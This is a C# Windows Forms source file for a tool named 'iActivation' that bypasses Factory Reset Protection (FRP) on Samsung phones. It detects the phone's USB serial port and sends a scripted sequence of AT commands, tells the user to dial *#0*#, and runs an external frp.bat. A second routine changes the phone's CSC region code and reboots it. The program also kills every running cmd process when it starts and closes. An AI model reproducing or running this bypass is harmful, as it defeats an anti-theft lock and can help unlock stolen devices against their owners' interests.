using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Ports;
using System.Linq;
using System.Management;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace iActivation
{
	public partial class MainForm : Form
	{
		public bool IsUSB = false;
		public static SerialPort SerialPort;
		public class info
		{
			public string Name { get; set; }
			public string Vid { get; set; }
			public string Pid { get; set; }
			public string Description { get; set; }
			public string DisplayName
			{
				get
				{
					return this.Description + " (" + this.Name + ")";
				}
			}
		}
		public MainForm()
		{
			InitializeComponent();
		}
		private List<MainForm.info> GetSerialPorts()
		{
			List<MainForm.info> result;
			using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM WIN32_SerialPort"))
			{
				List<ManagementBaseObject> ports = searcher.Get().Cast<ManagementBaseObject>().ToList<ManagementBaseObject>();
				result = ports.Select(delegate (ManagementBaseObject p)
				{
					MainForm.info info = new MainForm.info();
					info.Name = p.GetPropertyValue("DeviceID").ToString();
					info.Vid = p.GetPropertyValue("PNPDeviceID").ToString();
					info.Description = p.GetPropertyValue("Caption").ToString();
					Match VID = Regex.Match(info.Vid, "VID_([0-9A-F]{4})", RegexOptions.IgnoreCase);
					Match PID = Regex.Match(info.Vid, "PID_([0-9A-F]{4})", RegexOptions.IgnoreCase);
					if (VID.Success)
					{
						info.Vid = VID.Groups[1].Value;
					}
					if (PID.Success)
					{
						info.Pid = PID.Groups[1].Value;
					}
					return info;
				}).ToList<MainForm.info>();
			}
			return result;
		}
		private void LoadPorts()
		{
            this.USBDevices.DisplayMember = "DisplayName";
            List<MainForm.info> ports = this.GetSerialPorts();
			List<MainForm.info> coms = ports.FindAll((MainForm.info c) => c.Vid.Equals("04E8") && c.Pid.Equals("6860"));
			this.USBDevices.DataSource = coms;
		}
		public void ReadDevice(object sender, DoWorkEventArgs e)   
        {
			try
			{
				for (; ; )
				{
					this.LoadPorts();
					if (!string.IsNullOrEmpty(this.USBDevices.Text))
					{
						this.IsUSB = true;
						this.ReadUSB.WorkerSupportsCancellation = true;
						this.ReadUSB.CancelAsync();
						break;
					}
                    continue;
                }
			}
			catch (Exception ex)
			{
				Console.Error.WriteLine(ex.Message);
			}
		}
		private void MainFormLoad(object sender, EventArgs e)   
		{
			foreach (Process process in Process.GetProcessesByName("cmd"))
			{
				process.Kill();
			}
            this.LoadPorts();
            this.IsUSB = false;
			base.CenterToScreen();
			base.MaximizeBox = false;
			this.ReadUSB.RunWorkerAsync();
		}
		private void MainFormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				foreach (Process process in Process.GetProcessesByName("cmd"))
				{
					process.Kill();
				}
				Environment.Exit(1);
			}
			catch
			{
				Environment.Exit(1);
			}
		}
		private void MainFormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				foreach (Process process in Process.GetProcessesByName("cmd"))
				{
					process.Kill();
				}
				Environment.Exit(1);
			}
			catch
			{
				Environment.Exit(1);
			}
		}
		public void SetProgress(int progress)
		{
			this.DeviceProg.Value = progress;
		}
		private void USBDevices_DropDown(object sender, EventArgs e)
		{
			this.LoadPorts();
		}
		private void BypassLock_Click(object sender, EventArgs e)
		{
			this.BypassWorker.RunWorkerAsync();
		}
		private void ChangeCsc_Click(object sender, EventArgs e)
		{
			this.ChangeWorker.RunWorkerAsync();
		}
		private void BypassWorker_DoWork(object sender, DoWorkEventArgs e)
		{
            if (this.IsUSB)
			{
				bool IsReset = false;   
				this.SetProgress(5);
				this.RichText.Text = null;
				this.ChangeCsc.Enabled = false;
				this.BypassLock.Enabled = false;
                MainForm.info info = this.USBDevices.SelectedItem as MainForm.info;
				if (info != null)
				{
					MainForm.SerialPort = new SerialPort();
					MainForm.SerialPort.PortName = info.Name;
					try
					{
						MainForm.SerialPort.Open();
						if (!MainForm.SerialPort.IsOpen)
						{
							this.BypassLock.Enabled = true;
							this.ChangeCsc.Enabled = true;
							this.BypassLock.Text = "FAILED!";
							this.AppendText("FAILED TO OPEN PORT, CHECK PORT AND TRY AGAIN!!!!", Color.Red);
							return;
						}
						else
						{
							this.SetProgress(10);
							this.AppendText("WAIT BYPASSING...", Color.Black);
							this.BypassLock.Text = "WAIT...";
							MainForm.SerialPort.Write("AT+KSTRINGB=0,3\r\n");
							Thread.Sleep(1000);
							this.SetProgress(20);
							MessageBox.Show("GO TO EMERGENCY DIALER ENTER *#0*# CLICK OK", "XD", MessageBoxButtons.OK, MessageBoxIcon.Information);
							this.AppendText("ACTIVATING...", Color.Black);
							this.RichText.Text = "ACTIVATING...";
							MainForm.SerialPort.Write("AT+DUMPCTRL=1,0\r\n");
							Thread.Sleep(1000);
							this.SetProgress(30);
							MainForm.SerialPort.Write("AT+DEBUGLVC=0,5\r\n");
							Thread.Sleep(1000);
							this.SetProgress(50);
							MainForm.SerialPort.Write("AT+SWATD=0\r\n");
							Thread.Sleep(1000);
							MainForm.SerialPort.Write("AT+ACTIVATE=0,0,0\r\n");
							Thread.Sleep(1000);
							this.SetProgress(60);
							MainForm.SerialPort.Write("AT+SWATD=1\r\n");
							Thread.Sleep(1000);
							this.SetProgress(70);
							MainForm.SerialPort.Write("AT+DEBUGLVC=0,5\r\n");
							Thread.Sleep(1000);
							this.SetProgress(80);
							this.BypassLock.Text = "BYPASSING FRP...";
							this.AppendText("BYPASSING FRP....", Color.Black);
							this.AppendText(Environment.NewLine, Color.Black);
							USBAllow USBAllow = new USBAllow();
							USBAllow.ShowDialog();
                            if (USBAllow.IsAllow)
							{
                                string type = null;
                                Process process = new Process();
								process.StartInfo.WorkingDirectory = Application.StartupPath;
								process.StartInfo.FileName = "frp.bat";
								process.StartInfo.Arguments = string.Format("10", Array.Empty<object>());
								process.StartInfo.RedirectStandardOutput = true;
								process.StartInfo.CreateNoWindow = true;
								process.EnableRaisingEvents = true;
								process.StartInfo.UseShellExecute = false;
								process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
								process.Start();
								if (process != null)
                                {
									process.OutputDataReceived += ((s, value) =>
									{
										string text = value.Data;
										text += "\r\n";
										base.Invoke((Action)(() => { this.RichText.Text += text; }));
										Thread.Sleep(10);
										if(value.Data.Contains("FRP...OK"))
                                        {
											IsReset = true;
										}
										type = value.Data.Replace("Model: ", string.Empty);
									});
									process.BeginOutputReadLine();
								}
								process.WaitForExit();
								if (IsReset)
								{
									this.SetProgress(100);
									this.BypassLock.Text = "DONE!";
									this.AppendText(Environment.NewLine, Color.Black);
									this.AppendText("SAMSUNG " + type + " FRP SUCCESFULLY BYPASSED!", Color.Green);
									this.RichText.ForeColor = Color.Green;
									this.BypassWorker.WorkerSupportsCancellation = true;
									this.BypassWorker.CancelAsync();
									this.SetProgress(0);
								}
							}
						}
					}
					finally
					{
						if (MainForm.SerialPort.IsOpen)
						{
							MainForm.SerialPort.Close();
						}
					}
				}
			}
            else
			{
				this.ChangeCsc.Enabled = false;
				this.ChangeCsc.Text = "NO USB!";
				this.BypassLock.Enabled = false;
				this.BypassLock.Text = "NO USB!";
				MessageBox.Show("Connect your samsung device to computer via USB cable!", "USB!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				this.MainFormClosing(null, null);
			}
		}
		public void AppendText(string text, Color color)
		{
			this.RichText.SelectionStart = this.RichText.TextLength;
			this.RichText.SelectionLength = 0;
			this.RichText.SelectionColor = color;
			this.RichText.AppendText(text);
			this.RichText.SelectionColor = this.RichText.ForeColor;
		}
		private void ChangeWorker_DoWork(object sender, DoWorkEventArgs e)
		{
            if (this.IsUSB)
            {
				string text = this.CscTypeBox.Text.ToUpper();
				if (!string.IsNullOrEmpty(text) && text.Length == 3)
				{
					this.RichText.Text = null;
					this.ChangeCsc.Enabled = false;
					this.BypassLock.Enabled = false;
					MainForm.info info = this.USBDevices.SelectedItem as MainForm.info;
					if (info != null)
					{
						MainForm.SerialPort = new SerialPort();
						MainForm.SerialPort.PortName = info.Name;
						try
						{
							MainForm.SerialPort.Open();
							if (!MainForm.SerialPort.IsOpen)
							{
								this.BypassLock.Enabled = true;
								this.ChangeCsc.Enabled = true;
								this.BypassLock.Text = "FAILED!";
								this.AppendText("FAILED TO OPEN PORT, CHECK PORT AND TRY AGAIN!!!!", Color.Red);
								return;
							}
							else
							{
								this.SetProgress(30);
								this.AppendText("WAIT CHANGING...", Color.Black);
								this.BypassLock.Text = "WAIT...";
                                MainForm.SerialPort.Write("AT+SWATD=0\r\n");
								Thread.Sleep(1000);
								this.SetProgress(50);
								MainForm.SerialPort.Write("AT+ACTIVATE=0,0,0\r\n");
								Thread.Sleep(1000);
								this.SetProgress(80);
								MainForm.SerialPort.Write("AT+SWATD=1\r\n");
								Thread.Sleep(1000);
								this.SetProgress(90);
								MainForm.SerialPort.Write("AT+PRECONFG=2," + text + "\r\n");
								Thread.Sleep(1000);
								this.SetProgress(100);
								this.AppendText("REBOOTING...", Color.Black);
								this.ChangeCsc.Text = "REBOOTING...";
								MainForm.SerialPort.Write("AT+CFUN=1,1\r\n");
								this.BypassLock.Text = "DONE!";
								this.AppendText(Environment.NewLine, Color.Black);
								this.AppendText("SAMSUNG CSC CHANGE SUCCESFULLY:)", Color.Green);
								this.ChangeWorker.WorkerSupportsCancellation = true;
								this.ChangeWorker.CancelAsync();
								this.SetProgress(0);
							}
						}
						catch (Exception ex)
						{
							Console.WriteLine("Exception Occurred :{0},{1}", ex.Message, ex.StackTrace.ToString());
						}
						finally
						{
							if (MainForm.SerialPort.IsOpen)
							{
								MainForm.SerialPort.Close();
							}
						}
					}
				}
			}
            else
            {
				this.ChangeCsc.Enabled = false;
				this.ChangeCsc.Text = "NO USB!";
				this.BypassLock.Enabled = false;
				this.BypassLock.Text = "NO USB!";
				MessageBox.Show("Connect your samsung device to computer via USB cable!", "USB!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				this.MainFormClosing(null, null);
			}			
		}
    }
}
